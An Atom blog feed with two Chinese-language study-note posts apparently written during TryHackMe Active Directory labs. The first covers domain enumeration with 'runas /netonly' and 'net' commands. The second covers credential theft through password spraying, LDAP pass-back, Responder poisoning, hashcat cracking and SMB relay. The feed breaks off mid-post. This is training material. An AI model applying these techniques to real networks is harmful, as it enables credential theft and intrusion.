    <published>2023-09-07T08:41:18.000Z</published>
    <updated>2023-09-08T09:04:11.479Z</updated>
    
    <content type="html"><![CDATA[<p>继上一篇的破坏AD域后  接下来写这个枚举AD域</p><h2 id="为什么要进行-AD-枚举"><a href="#为什么要进行-AD-枚举" class="headerlink" title="为什么要进行 AD 枚举"></a>为什么要进行 AD 枚举</h2><p>前面跟着进行配置就好了</p><p>这里的话给了AD域的凭证 就是账号密码  直接就可以进行登录了</p><p><strong>(这个域用户的主机开启了ssh和RDP服务 我们可以直接连接其电脑)</strong></p><h2 id="凭证注入"><a href="#凭证注入" class="headerlink" title="凭证注入"></a>凭证注入</h2><p>这里的讲的就是在获取域凭证之后 利用RDP或者SSH登录后  来在该域中添加一个新的域用户(<strong>就是我们自己</strong>)  <strong>相当于后门吧</strong></p><p>在讨论 AD 对象和枚举之前，我们首先讨论凭据注入方法。从破坏 AD 网络中，您会发现凭据通常可以在不损害加入域的计算机的情况下找到。特定的枚举技术可能需要特定的设置才能工作。</p><p>需要一台 Windows 计算机。这将使我们能够使用几种内置方法来进行枚举和利用。在此网络中，我们将探索这些内置工具之一，称为 <code>runas.exe</code> 二进制文件。</p><h2 id="Runas-Explained-解释"><a href="#Runas-Explained-解释" class="headerlink" title="Runas Explained (解释)"></a>Runas Explained (解释)</h2><p>讲一下这个Runas这个工具的作用</p><ul><li><p>runas.exe 是 Windows 操作系统中的一个实用工具，用于以不同的用户身份运行程序或命令。它允许你在一个用户账户下以另一个用户账户的权限运行程序。</p><p>runas.exe 的主要功能是允许管理员或具有特定权限的用户在不切换用户账户的情况下执行某些任务。当你需要以管理员权限运行某个程序或命令时，可以使用 runas.exe 来提升权限，而不必完全切换到管理员账户。</p><p>在命令提示符或运行对话框中，你可以使用以下语法来运行 runas.exe：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas [/profile] [/env] [/netonly] [/savecred] [/smartcard] [/showtrustlevels] [/trustlevel] /user:&lt;UserName&gt; &lt;Command&gt;</span><br></pre></td></tr></table></figure><p>其中，/user:<UserName> 用于指定要以哪个用户账户的身份运行程序或命令，<Command> 是要运行的程序或命令。</p><p>需要注意的是，使用 runas.exe 运行程序或命令需要提供正确的用户凭据（例如用户名和密码），并且用户账户必须具有足够的权限来执行所需的操作。</p><p>请注意，由于 runas.exe 涉及到权限提升和用户凭据的使用，所以在使用时要小心，并确保只在可信任的环境中使用。</p></li></ul><p><strong>简单来说就是在我们控制的计算机下通过获取的凭证来执行任何想要执行的命令(域的名字也要知道)</strong></p><p>在安全评估中，您通常可以访问网络并刚刚发现 AD 凭据，但没有方法或权限来创建新的加入域的计算机。因此，我们需要能够在我们控制的 Windows 计算机上使用这些凭据。</p><p>如果我们有 : 格式的 AD 凭据，我们可以使用 Runas（一个合法的 Windows 二进制文件）将凭据注入到内存中。通常的 Runas 命令看起来像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas.exe /netonly /user:&lt;domain&gt;\&lt;username&gt; cmd.exe</span><br></pre></td></tr></table></figure><ul><li>/netonly - 由于我们没有加入域，因此我们希望加载网络身份验证的凭据，但不针对域控制器进行身份验证。因此，在计算机上本地执行的命令将在标准 Windows 帐户的上下文中运行，但任何网络连接都将使用此处指定的帐户进行。</li><li>/user - 在这里，我们提供域和用户名的详细信息。使用完全限定域名 (FQDN) 而不仅仅是域的 NetBIOS 名称始终是一个安全的选择，因为这将有助于解决问题。</li><li>cmd.exe - 这是我们在注入凭据后要执行的程序。这可以更改为任何内容，但最安全的选择是 cmd.exe，因为您可以使用它来启动您想要的任何内容，并注入凭据。</li></ul><p>运行此命令后，系统将提示您提供密码。请注意，由于我们添加了 /netonly 参数，因此域控制器不会直接验证凭据，<strong>因此它将接受任何密码</strong>。我们仍然需要确认网络凭据是否已成功且正确加载。</p><p>注意：如果您使用自己的 Windows 计算机，则应确保以管理员身份运行第一个命令提示符。这会将管理员令牌注入到 CMD 中。如果您运行需要 Runas 生成的 CMD 本地管理权限的工具，则令牌将已经可用。这不会为您提供网络管理权限，但会确保您执行的任何本地命令都将以管理权限执行。</p><p>这样的好处就是在本地访问别的东西的时候是不需要向域控制器那边验证凭据了   直接就本地验证就行 </p><p><strong>(下面就是使用这个runas的好处)</strong></p><p><img src="../images/image-20230907174837605.png" alt="image-20230907174837605"></p><h2 id="通过-Microsoft-管理控制台进行枚举"><a href="#通过-Microsoft-管理控制台进行枚举" class="headerlink" title="通过 Microsoft 管理控制台进行枚举"></a>通过 Microsoft 管理控制台进行枚举</h2><p>这个就不多写了 就是通过RDP后  通过MMC来查看域的整个结果和人员服务器组成情况</p><h2 id="通过命令提示符进行枚举"><a href="#通过命令提示符进行枚举" class="headerlink" title="通过命令提示符进行枚举"></a>通过命令提示符进行枚举</h2><p>这里的前提都是在能登录到对方主机的前提下  ssh或者rdp</p><p>CMD 有一个内置命令，我们可以使用它来枚举有关 AD 的信息，即 <code>net</code> 。 <code>net</code> 命令是一个枚举有关本地系统和 AD 信息的便捷工具。我们将看看从这个位置可以列举的一些有趣的事情，但这并不是一个详尽的列表。</p><p>我们可以使用 <code>net</code> 命令通过 <code>user</code> 子选项列出 AD 域中的所有用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net user /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">User accounts for \\THMDC</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">aaron.conway             aaron.hancock            aaron.harris</span><br><span class="line">aaron.johnson            aaron.lewis              aaron.moore</span><br><span class="line">aaron.patel              aaron.smith              abbie.joyce</span><br><span class="line">abbie.robertson          abbie.taylor             abbie.walker</span><br><span class="line">abdul.akhtar             abdul.bates              abdul.holt</span><br><span class="line">abdul.jones              abdul.wall               abdul.west</span><br><span class="line">abdul.wilson             abigail.cox              abigail.cox1</span><br><span class="line">abigail.smith            abigail.ward             abigail.wheeler</span><br><span class="line">[....]</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>这将为我们返回所有 AD 用户，并有助于确定域的大小以进行进一步的攻击。我们还可以使用此子选项来枚举有关单个用户帐户的更详细信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net user zoe.marshall /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">User name                    zoe.marshall</span><br><span class="line">Full Name                    Zoe Marshall</span><br><span class="line">Comment</span><br><span class="line">User&#x27;s comment</span><br><span class="line">Country/region code          000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            2/24/2022 10:06:06 PM</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          2/24/2022 10:06:06 PM</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script</span><br><span class="line">User profile</span><br><span class="line">Home directory</span><br><span class="line">Last logon                   Never</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships</span><br><span class="line">Global Group memberships     *Domain Users         *Internet Access</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>注意：如果用户只是少数 AD 组的一部分，此命令将能够向我们显示组成员身份。但是，通常，在超过十个组成员身份后，该命令将无法列出所有组成员。</p><p>我们可以使用 <code>net</code> 命令通过使用 <code>group</code> 子选项来枚举域的组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net group /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">Group Accounts for \\THMDC</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">*Cloneable Domain Controllers</span><br><span class="line">*DnsUpdateProxy</span><br><span class="line">*Domain Admins</span><br><span class="line">*Domain Computers</span><br><span class="line">*Domain Controllers</span><br><span class="line">*Domain Guests</span><br><span class="line">*Domain Users</span><br><span class="line">[...]</span><br><span class="line">*Schema Admins</span><br><span class="line">*Server Admins</span><br><span class="line">*Tier 0 Admins</span><br><span class="line">*Tier 1 Admins</span><br><span class="line">*Tier 2 Admins</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>这些信息可以帮助我们找到目标执行的特定群体。我们还可以通过在同一命令中指定组来枚举更多详细信息，例如组的成员身份：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net group &quot;Tier 1 Admins&quot; /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">Group name     Tier 1 Admins</span><br><span class="line">Comment</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">t1_arthur.tyler          t1_gary.moss             t1_henry.miller</span><br><span class="line">t1_jill.wallis           t1_joel.stephenson       t1_marian.yates</span><br><span class="line">t1_rosie.bryant</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>我们可以使用 <code>net</code> 命令通过 <code>accounts</code> 子选项枚举域的密码策略：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net accounts /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">Force user logoff how long after time expires?:       Never</span><br><span class="line">Minimum password age (days):                          0</span><br><span class="line">Maximum password age (days):                          Unlimited</span><br><span class="line">Minimum password length:                              0</span><br><span class="line">Length of password history maintained:                None</span><br><span class="line">Lockout threshold:                                    Never</span><br><span class="line">Lockout duration (minutes):                           30</span><br><span class="line">Lockout observation window (minutes):                 30</span><br><span class="line">Computer role:                                        PRIMARY</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>这将为我们提供有用的信息，例如：</p><ul><li>Length of password history kept. Meaning how many unique passwords must the user provide before they can reuse an old password.<br>保留的密码历史记录长度。这意味着用户必须提供多少个唯一密码才能重新使用旧密码。</li><li>The lockout threshold for incorrect password attempts and for how long the account will be locked.<br>错误密码尝试的锁定阈值以及帐户将被锁定的时间。</li><li>The minimum length of the password.<br>密码的最小长度。</li><li>The maximum age that passwords are allowed to reach indicating if passwords have to be rotated at a regular interval.<br>允许密码达到的最长期限，指示密码是否必须定期轮换。</li></ul><p><strong><code>net</code> 命令必须从加入域的计算机执行。如果计算机未加入域，则它将默认为 WORKGROUP 域。</strong></p><h2 id="通过-PowerShell-进行枚举"><a href="#通过-PowerShell-进行枚举" class="headerlink" title="通过 PowerShell 进行枚举"></a>通过 PowerShell 进行枚举</h2><p>这个懒得复制了  直接去thm直接看就行了</p><h2 id="通过-Bloodhound-进行枚举-这里说这个是目前最牛的工具"><a href="#通过-Bloodhound-进行枚举-这里说这个是目前最牛的工具" class="headerlink" title="通过 Bloodhound 进行枚举(这里说这个是目前最牛的工具)"></a>通过 Bloodhound 进行枚举(这里说这个是目前最牛的工具)</h2><p>这个工具确实牛逼   <strong>(使用条件)</strong></p><ul><li>能够ssh或者RDP目标主机  (就是获得到凭证了)</li><li>然后上传Sharphound脚本获取整个AD域的所有信息  </li><li>在linux上进行Bloodhound 工具进行查看</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;继上一篇的破坏AD域后  接下来写这个枚举AD域&lt;/p&gt;
&lt;h2 id=&quot;为什么要进行-AD-枚举&quot;&gt;&lt;a href=&quot;#为什么要进行-AD-枚举&quot; class=&quot;headerlink&quot; title=&quot;为什么要进行 AD 枚举&quot;&gt;&lt;/a&gt;为什么要进行 AD 枚举&lt;/h2&gt;&lt;</summary>
      
    
    
    
    
    <category term="thm-枚举AD域" scheme="https://ke1nys.github.io/tags/thm-%E6%9E%9A%E4%B8%BEAD%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>thm-破坏AD域</title>
    <link href="https://ke1nys.github.io/posts/7b844e49.html"/>
    <id>https://ke1nys.github.io/posts/7b844e49.html</id>
    <published>2023-09-04T11:58:06.000Z</published>
    <updated>2023-09-07T08:40:08.648Z</updated>
    
    <content type="html"><![CDATA[<p>上个星期刚把域控的部分看了一遍</p><p><img src="../images/image-20230904210903273.png" alt="image-20230904210903273"></p><p><strong>这是本题的这个网络拓扑图</strong></p><p>搭建环境就不多说了   跟着做就行了 </p><h2 id="破坏AD域的几种方法"><a href="#破坏AD域的几种方法" class="headerlink" title="破坏AD域的几种方法"></a>破坏AD域的几种方法</h2><p><img src="../images/image-20230905111806257.png" alt="image-20230905111806257"></p><p><img src="../images/image-20230905111654897.png" alt="image-20230905111654897"></p><p>以下技术来恢复此网络中的 AD 凭据：</p><h2 id="开源情报-OSINT-和网络钓鱼"><a href="#开源情报-OSINT-和网络钓鱼" class="headerlink" title="开源情报 (OSINT) 和网络钓鱼"></a>开源情报 (OSINT) 和网络钓鱼</h2><p>开始可以先从这里来获取情报</p><p>获取第一组 AD <strong>凭据</strong>的两种流行方法是开源情报 (OSINT) 和网络钓鱼</p><p>这些地方可能都会导致凭证泄露</p><p><strong>HaveIBeenPwned 和 DeHashed</strong> 等网站提供了出色的平台，可以确定某人的信息（例如工作电子邮件）是否曾经涉及公开的数据泄露事件。</p><h2 id="NTLM-验证服务"><a href="#NTLM-验证服务" class="headerlink" title="NTLM 验证服务"></a>NTLM 验证服务</h2><p>新技术 LAN 管理器 (NTLM) 是一套用于在 AD 中验证用户身份的安全协议。 NTLM 可用于通过使用称为 NetNTLM 的基于质询-响应的方案进行身份验证。这种身份验证机制被网络上的服务大量使用。但是，使用 NetNTLM 的服务也可以暴露在互联网上。以下是一些流行的例子：</p><ul><li>Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.<br>公开 Outlook Web App (OWA) 登录门户的内部托管 Exchange（邮件）服务器。</li><li>Remote Desktop Protocol (RDP) service of a server being exposed to the internet.<br>暴露于互联网的服务器的远程桌面协议（RDP）服务。</li><li>Exposed VPN endpoints that were integrated with AD.<br>与 AD 集成的公开 VPN 端点。</li><li>Web applications that are internet-facing and make use of NetNTLM.<br>面向互联网并使用 NetNTLM 的 Web 应用程序。</li></ul><p>NetNTLM，通常也称为 Windows 身份验证或 NTLM 身份验证，允许应用程序扮演客户端和 AD 之间的中间人的角色。所有身份验证材料都以质询的形式转发到域控制器，如果成功完成，应用程序将对用户进行身份验证。</p><p>这意味着应用程序代表用户进行身份验证，而不是直接在应用程序本身上对用户进行身份验证。这可以防止应用程序存储 AD 凭据，<strong>该凭据应仅存储在域控制器上。这个过程如下图所示：</strong></p><p><img src="../images/c9113ad0ff443dd0973736552e85aa69.png" alt="img"></p><p>这个图很好的进行解释了</p><h2 id="暴力登录攻击"><a href="#暴力登录攻击" class="headerlink" title="暴力登录攻击"></a>暴力登录攻击</h2><p>这里的话我们采用的不是密码爆破 因为这样子账户被锁</p><p>这里采用的是密码喷射攻击 就是用同一个密码来爆破账户进行攻击</p><p><strong>(可以这样做的原因是因为刚入职的员工密码都是固定的  如果没有修改的话就可以爆破成功)</strong></p><p><strong>以下是更加详细的解释</strong></p><p>由于大多数 AD 环境都配置了帐户锁定，因此我们无法运行完整的暴力攻击。相反，我们需要执行密码喷射攻击。我们不会尝试多个不同的密码，这可能会触发帐户锁定机制，而是选择并使用一个密码并尝试使用我们获得的所有用户名进行身份验证。但是，应该注意的是，由于这些类型的攻击将生成大量失败的身份验证尝试，因此可以检测到这些类型的攻击。</p><p><img src="../images/image-20230905113707762.png" alt="image-20230905113707762"></p><p>写个脚本 批量来打  这样就可以了</p><h2 id="LDAP-绑定凭证"><a href="#LDAP-绑定凭证" class="headerlink" title="LDAP 绑定凭证"></a>LDAP 绑定凭证</h2><p><img src="../images/image-20230905115048701.png" alt="image-20230905115048701"></p><p><strong>这是和NTLM协议的差别</strong></p><p>应用程序可以使用的另一种 AD 身份验证方法是轻量级目录访问协议 (LDAP) 身份验证。 LDAP 身份验证与 NTLM 身份验证类似。但是，通过 LDAP 身份验证，应用程序可以直接验证用户的凭据。该应用程序有一对 AD 凭据，可以首先使用它们来查询 LDAP，然后验证 AD 用户的凭据。</p><p>LDAP 身份验证是与 AD 集成的第三方（非 Microsoft）应用程序的一种流行机制。其中包括应用程序和系统，例如：</p><ul><li>Gitlab</li><li>Jenkins 詹金斯</li><li>Custom-developed web applications<br>定制开发的网络应用程序</li><li>Printers 打印机</li><li>VPNs VPN</li></ul><p><strong>这个的话比较方便  因为这个不是像NTLM协议一样限制于windows</strong></p><p>如果这些应用程序或服务中的任何一个暴露在互联网上，则可以使用与针对 NTLM 身份验证系统的攻击相同类型的攻击。然而，由于使用 LDAP 身份验证的服务需要一组 AD 凭据，因此它开辟了额外的攻击途径。本质上，我们可以尝试恢复服务使用的 AD 凭据，以获得对 AD 的经过身份验证的访问。通过LDAP进行认证的流程如下所示：</p><p><img src="../images/d2f78ae2b44ef76453a80144dac86b4e.png" alt="img"></p><h2 id="LDAP-Pass-back-Attacks-LDAP-回传攻击"><a href="#LDAP-Pass-back-Attacks-LDAP-回传攻击" class="headerlink" title="LDAP Pass-back Attacks LDAP 回传攻击"></a>LDAP Pass-back Attacks LDAP 回传攻击</h2><p>然而，可以针对 LDAP 身份验证机制执行另一种非常有趣的攻击，称为 LDAP 回传攻击。当您获得对内部网络的初始访问权限（例如在会议室中插入恶意设备）时，这是针对网络设备（例如打印机）的常见攻击。</p><p>当我们访问指定 LDAP 参数的设备配置时，可以执行 LDAP 回传攻击。例如，这可以是网络打印机的 Web 界面。通常，这些接口的凭据保留为默认凭据，例如 <code>admin:admin</code> 或 <code>admin:password</code> 。在这里，我们无法直接提取 LDAP 凭据，因为密码通常是隐藏的。但是，我们可以更改 LDAP 配置，例如 LDAP 服务器的 IP 或主机名。在 LDAP 回传攻击中，我们可以将此 IP 修改为我们的 IP，然后测试 LDAP 配置，这将强制设备尝试对我们的恶意设备进行 LDAP 身份验证。我们可以拦截此身份验证尝试以恢复 LDAP 凭据。</p><p>（<strong>使用这个攻击的话就是主要跟他的这个LDAP的两次绑定有关</strong>）</p><p>主要就是进行第一次绑定的LDAP请求绑定包的抓取</p><p><strong>(就是上面图片步骤2的过程)</strong></p><h3 id="执行LDAP回传"><a href="#执行LDAP回传" class="headerlink" title="执行LDAP回传"></a>执行LDAP回传</h3><p><img src="../images/image-20230905200039028.png" alt="image-20230905200039028"></p><p>假如我们插入了恶意设备  获取了这个打印机的后台设置界面</p><p>这里的话这个LDAP验证流程就和上面的那个图一样</p><p><strong>这里搭建的LDAP服务器的流程就不写了   thm直接自己看就行了</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -SX -i breachad tcp port 389</span><br><span class="line">//抓包指令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在给出的命令 tcpdump -SX -i breachad tcp port 389 中，-i breachad 是一个选项用于指定要捕获数据包的网络接口。</span><br><span class="line">具体解释如下：</span><br><span class="line">-i：这是 tcpdump 命令中用于指定要捕获数据包的网络接口的选项。</span><br><span class="line">breachad：这是参数，表示要使用名为 &quot;breachad&quot; 的网络接口。通常，网络接口名称可以是网卡设备（例如 eth0、enp2s0）或其他虚拟接口。</span><br><span class="line">因此，在给定命令中，通过 -i breachad 指定了将从名为 &quot;breachad&quot; 的网络接口上捕获 TCP 端口号为 389 的数据包。</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230905201717038.png" alt="image-20230905201717038"></p><p>因为搭建LDAP恶意服务器的时候设置的明文传输  所以就抓包的时候就可以直接看到密码</p><h2 id="Authentication-Relays-身份验证中继"><a href="#Authentication-Relays-身份验证中继" class="headerlink" title="Authentication Relays 身份验证中继"></a>Authentication Relays 身份验证中继</h2><p>服务器消息块 (SMB) 协议允许客户端（如工作站）与服务器（如文件共享）进行通信。在使用 Microsoft AD 的网络中，SMB 负责管理从网络间文件共享到远程管理的所有事务。即使当您尝试打印文档时计算机收到的“缺纸”警报也是 SMB 协议的作用。</p><p>然而，早期版本的 SMB 协议的安全性被认为是不够的。发现了多个漏洞和漏洞，可用于恢复凭据，甚至在设备上执行代码。尽管其中一些漏洞在协议的新版本中得到了解决，但组织通常不会强制使用更新的版本，因为遗留系统不支持它们。我们将研究使用 SMB 进行 NetNTLM 身份验证的两种不同漏洞：</p><ul><li>由于NTLM Challenges可以被拦截，我们可以使用离线破解技术来恢复与NTLM Challenge相关的密码。然而，这种破解过程比直接破解 NTLM 哈希要慢得多。</li><li>我们可以使用我们的流氓设备发起中间人攻击，在客户端和服务器之间中继 SMB 身份验证，这将为我们提供主动的经过身份验证的会话以及对目标服务器的访问。</li></ul><p><strong>这里接下来讲的东西有点难理解</strong></p><p>这里的话先讲一下这个在SMB期间发生的身份验证  我们将使用 <code>Responder</code> 尝试拦截 NetNTLM 挑战来破解它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LLMNR, NBT-NS, and WPAD LLMNR、NBT-NS 和 WPAD</span><br><span class="line"></span><br><span class="line">//这些就是在SMB身份验证期间可能会利用到的协议</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>LLMNR（Link-Local Multicast Name Resolution）、NBT-NS（NetBIOS Name Service）和WPAD（Web Proxy Auto-Discovery）这几个协议在SMB（Server Message Block）身份验证过程中可能会被使用到。</p><ol><li>LLMNR：LLMNR是一种用于本地网络上主机名解析的协议。当Windows系统无法通过DNS解析主机名时，它会尝试使用LLMNR来寻找其他设备并获取其IP地址。攻击者可以利用LLMNR欺骗目标系统，并截获其发出的名称查询请求，从而进行中间人攻击或捕获用户凭据。</li><li>NBT-NS：NBT-NS是NetBIOS服务的一部分，在Windows操作系统中负责将NetBIOS名称转换为IP地址。类似于LLMNR，攻击者可以通过发送恶意响应来欺骗目标系统，并截取其发出的名称查询请求以获取敏感信息或执行中间人攻击。</li><li>WPAD：WPAD协议用于自动配置Web代理设置。客户端设备通常会根据DHCP服务器提供的选项、DNS记录或本地配置查找代理服务器。如果开启了WPAD功能且未正确配置安全控制，那么恶意用户可以利用此漏洞设置一个恶意代理服务器，并拦截所有流经该代理服务器的HTTP请求，包括SMB身份验证中的凭据信息。</li></ol><p>因此，攻击者可以利用LLMNR、NBT-NS和WPAD协议的弱点来执行中间人攻击或窃取用户凭据。为了提高安全性，建议在网络环境中禁用或限制这些协议，并采取其他安全措施（如启用加密通信）来保护SMB身份验证过程中的敏感信息</p><p>由于这些协议依赖于在本地网络上广播的请求，因此我们的恶意设备也会收到这些请求。通常，这些请求会被简单地丢弃，因为它们不是针对我们的主机的。然而，响应者将主动侦听请求并发送有毒响应，告诉请求主机我们的 IP 与请求的主机名相关联。通过毒害这些请求，Responder 尝试强制客户端连接到我们的 AttackBox。在同一行中，它开始托管多个服务器，例如 SMB、HTTP、SQL 等，以捕获这些请求并强制进行身份验证。</p><p><strong>这就是SMB漏洞产生的原因之一</strong>   </p><p><strong>接下来就重点介绍一下<code>Responder</code>这个工具</strong></p><h3 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h3><p>这里介绍一下这个工具   就知道这个工具为什么能用在这了</p><p><img src="../images/image-20230905213851249.png" alt="image-20230905213851249"></p><p><strong>刚好就是可以模拟这些协议  然后欺骗客户端向其发送响应，从而获取用户凭据或敏感信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要注意的一件事是，Responder 实质上试图通过毒害连接来赢得竞争条件，以确保您拦截连接。这意味着响应程序通常仅限于本地网络上的中毒身份验证质询</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">尽管 Responder 在从连接到组织 LAN 的恶意设备执行时能够拦截和毒害更多身份验证请求，但了解这种行为可能具有破坏性并因此被检测到至关重要。通过中毒身份验证请求，正常的网络身份验证尝试将失败，这意味着用户和服务将无法连接到他们想要连接的主机和共享</span><br></pre></td></tr></table></figure><p><a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p><p>下载好这个<code>Responder</code>工具后 并且和tcpdump一样设置好要监听的端口  然后等待就行</p><p><img src="../images/image-20230905214852367.png" alt="image-20230905214852367"></p><p>这样就成功的拦截到了NetNTLM 质询和响应</p><p>接下来就使用<code>hashcat</code>来爆破这个hash值了</p><p><img src="../images/image-20230905215752388.png" alt="image-20230905215752388"></p><p>这里利用的就是这个中间人攻击技术</p><p>中继攻击（Relay Attack）是一种常见的网络攻击技术，旨在利用通信协议的弱点来获取用户凭据或执行恶意操作。其工作原理可以概括为以下步骤：</p><ol><li>拦截受害者请求：攻击者将自己置于目标用户和目标服务器之间，监听受害者发出的请求。</li><li>中继请求：当受害者向目标服务器发送一个认证请求时（如登录、身份验证等），攻击者会立即将该请求转发到真正的目标服务器上。</li><li>获取响应：一旦目标服务器对认证请求进行响应，响应信息就会被传回给攻击者。</li><li>中继响应：收到来自目标服务器的响应后，攻击者会迅速将该响应转发给受害者设备，并假装自己是真实的服务器。</li><li>伪造成功认证：由于整个过程都是透明地进行，对于受害者而言，他们可能不知道与谁通信并且错误地相信已经通过了身份验证或登录成功。</li></ol><p>通过中继攻击，黑客可以窃取用户凭据、执行未授权操作、篡改数据等。这种类型的攻击特别有效在那些没有使用加密保护通信流量或缺乏合适的身份验证和授权机制的协议中。</p><p><img src="../images/6baba3537d36d0fa78c6f61cf1386f6f.png" alt="img"></p><p><strong>就差不多是这样子  起到一个转发和伪装的作用</strong></p><h2 id="Microsoft-部署工具包"><a href="#Microsoft-部署工具包" class="headerlink" title="Microsoft 部署工具包"></a>Microsoft 部署工具包</h2><p>大型组织需要工具来部署和管理资产的基础设施。在大型组织中，您无法让 IT 人员使用 DVD 甚至 USB 闪存驱动器在每台计算机上安装软件。幸运的是，微软已经提供了管理资产所需的工具。然而，我们也可以利用这些工具中的错误配置来破坏 AD。</p><p>Microsoft 部署工具包 (MDT) 是一项 Microsoft 服务，可帮助自动部署 Microsoft 操作系统 (OS)。大型组织使用 MDT 等服务来帮助更有效地在其资产中部署新映像，因为可以在中央位置维护和更新基础映像。</p><p>Microsoft 部署工具包 (MDT) 是一项 Microsoft 服务，可帮助自动部署 Microsoft 操作系统 (OS)。大型组织使用 MDT 等服务来帮助更有效地在其资产中部署新映像，因为可以在中央位置维护和更新基础映像。</p><p>通常，MDT 与 Microsoft 的系统中心配置管理器 (SCCM) 集成，后者管理所有 Microsoft 应用程序、服务和操作系统的所有更新。 MDT 用于新部署。从本质上讲，它允许 IT 团队预配置和管理启动映像。因此，如果他们需要配置一台新机器，他们只需要插入网线，一切都会自动发生。他们可以对启动映像进行各种更改，例如已经安装 Office365 等默认软件和组织选择的防病毒软件。它还可以确保在安装第一次运行时更新新版本。</p><p>SCCM 几乎可以被视为 MDT 的扩展和老大哥。软件安装后会发生什么？嗯，SCCM 进行这种类型的补丁管理。它允许 IT 团队查看整个地产中安装的所有软件的可用更新。团队还可以在沙箱环境中测试这些补丁，以确保它们稳定，然后再将它们集中部署到所有加入域的计算机。它使 IT 